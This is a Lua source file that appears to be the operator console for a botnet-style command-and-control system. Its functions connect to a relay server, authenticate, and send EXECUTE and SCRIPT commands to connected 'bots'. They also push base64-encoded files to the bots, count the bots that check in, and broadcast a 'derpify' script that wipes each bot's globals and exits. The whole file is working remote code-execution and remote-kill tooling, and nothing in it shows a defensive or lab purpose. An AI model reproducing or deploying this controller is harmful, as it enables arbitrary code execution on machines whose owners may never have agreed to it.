function control(host, port)
	port = port or 13337
	local success, sock = pcall(net.connect, net, host, port)
	if(not success)then
		return nil
	end
	
	local ctrl = {
		sock = sock;
		cmdMgr = CommandManager(sock);
		--Main way of seeing what's waiting on the connection
		--Attempts to create a user-friendly representation of received data
		read = function(self)
			while(true)do
				local dat = self.cmdMgr:get()
				if(not dat)then
					break
				end
				dat = json.dec(dat)
				self:fromserver(dat)
			end
		end;
		blockread = function(self, timeout)--Reads until a message arrives, or until timeout if timeout isn't nil
			local dat = self.cmdMgr:blockget(timeout or nil)
			dat = json.dec(dat)
			self:fromserver(dat)
		end;
		send = function(self, command, wait)--Send command to server
			if(wait == nil) then
				wait = 2.5
			end
			self:toserver(command)
			self.cmdMgr:putJSON(command)
			if((not wait) or wait <= 0)then
				return
			end
			sleep(wait*1000)
			return self:read()
		end;
		notify = function(self, data)--Display a notification that isn't sent anywhere
			print("== "..table.val_to_str(data))
		end;
		fromserver = function(self, data)--Display something nicely to console sent from server
			print(">> " .. table.val_to_str(data))
			print(self:commandStringify(data))
		end;
		toserver = function(self, data)--Display something nicely to console sent to server
			print("<< " .. table.val_to_str(data))
			print(self:commandStringify(data))
		end;
		commandStringify = function(self, data)
			data = table.copy(data)
			if(type(data)~="table")then
				return table.val_to_str(data)
			end
			local res = ""
			if(data["ID"])then
				data["TARGET"]="<YOU>"
				data["ID"]=nil
			end
			if(data["SENDER"])then
				res = res .. data["SENDER"]:sub(1,8)
				data["SENDER"] = nil
			end
			if(data["TARGET"])then
				res = res .. "@" .. data["TARGET"]:sub(1,8)
				data["TARGET"] = nil
			end
			if(next(data))then
				res = res.." -> "
				if(data["COMMAND"])then
					res = res .. " <" .. data["COMMAND"] .. "> "
					data["COMMAND"] = nil
				end
				if(data["CONTENT"])then
					res = res .. table.val_to_str(data["CONTENT"])
					data["CONTENT"] = nil
				end
				if(next(data))then
					res = res.." | "..table.val_to_str(data)
				end
			end
			return res
		end;
		CMD = function(self, ctype, args)
			local command = {}
			command["COMMAND"] = ctype
			for k,v in pairs(args)do
				command[k]=v
			end
			return command
		end;
		EXECUTE = function(self, commands)--commands can be a single string or a list of commands
			return self:CMD("EXECUTE", {CONTENT=commands})
		end;
		SCRIPT = function(self, str)
			return self:CMD("SCRIPT", {CONTENT=str})
		end;
		SAVEBIN = function(self, filename, data)
			return self:CMD("SAVEBIN", {FILENAME=filename, DATA=data})
		end;
		--Read file from executable's current directory, encode in base64 for sending
		readtobin = function(self, filename)
			local fcont = file.read(filename)
			if(fcont == "")then
				return
			end
			return base64.enc(fcont);
		end;
		SENDFILE = function(self, localfile, destfile)
			local data = self:readtobin(localfile)
			if(not data)then
				return
			end
			return self:savebin(destfile, data)
		end;
		RELAY = function(self, command, target)
			return {COMMAND="RELAY", CONTENT=command, TARGET=(target or nil)}
		end;
		ident = function(self, authcode)
			self:read()
			self:send(self:CMD("IDENTIFY", genIdentController(authcode)),false)
			self:notify("Waiting for identification status...")
			local response = self.cmdMgr:blockget(5000)
			if(not response)then
				self:notify("Auth attempt failed, the server did not respond.")
				return false
			end
			self:notify(response)
			response = json.dec(response)--Turn the string back into an object
			if(response["COMMAND"] ~= "STATUS" or response["CONTENT"]["IDENT"] ~= "SUCCESS")then
				return false
			end
			return true
		end;
		botresponses = function(self, command, wait)
			wait = wait or 5000
			self:send(command, false)--Send but don't wait or read
			self:notify("Waiting for responses...")
			sleep(wait)--Now wait
			self:notify("Retrieving responses...")
			local responses = {}
			while(true)do
				local response = self.cmdMgr:get()
				if(response==nil)then
					break
				end
				local success, responseJson = pcall(json.dec,response)
				if(success)then
					if(responseJson["COMMAND"]~="RESPONSE")then
						self:fromserver(responseJson)
					else
						table.insert(responses, responseJson)
					end
				else
					self:notify("JSON Decode failed on data:")
					self:notify(response)
					self:notify("Reason: "..responseJson)--Due to pcall failure, responseJson contains the error message
				end
			end
			return responses
		end;
		botcount = function(self)
			local responses = self:botresponses(self:RELAY(self:SCRIPT("return \"AYE\"")), 1500)
			--I'd use the # operator for this, but we must ensure the responses were actually from this command
			--so we'll verify the message contents are correct on each one
			local count=0
			for _,response in pairs(responses)do
				self:notify("Bot ["..response["SENDER"].."] Checking in")
				if(response["CONTENT"] == "AYE")then
					count = count + 1--Lua and its lack of += blurgh...
				end
			end
			return count
		end;
		--Scrambles a bot beyond recognition, in case it was hijacked or acting otherwise maliciously to the server
		--Do not omit the "bot" argument in any situation not requiring a complete shutdown of the network.
		derpify = function(self, bot)
			local derpyscript = ([[
				local _G = _G
				local collectgarbage = _G["collectgarbage"]
				local exit = _G["exit"]
				local print = _G["print"]
				local pcall = _G["pcall"]
				local pairs = _G["pairs"]
				pcall(print,"Goodbye")
				self = nil
				for k,v in pairs(_G)do
					_G[k] = "Derp"
				end
				collectgarbage() ]]..--Delete everything for real
				[[collectgarbage("stop") ]]..--Now stop garbage collection entirely
				[[exit()
			]]):gsub("%s+", ' ');
			self:send(self:RELAY(self:SCRIPT(derpyscript), bot), false)
		end;
		shutdown = function(self)--Interface convenience for a priority one shutdown
			print("Are you sure you wish to shut down the network? (y/n)")
			while(true)do
				local yn = io.read()
				if(yn == "n")then
					print("Shutdown Averted.")
					return
				elseif(yn == "y")then
					print("Shutting down bot network...")
					self:derpify()--Targetless call to derpify shuts down all bots actively listening
					print("Command Sent.")
					return
				end
			end
		end;
	}
	return ctrl
end
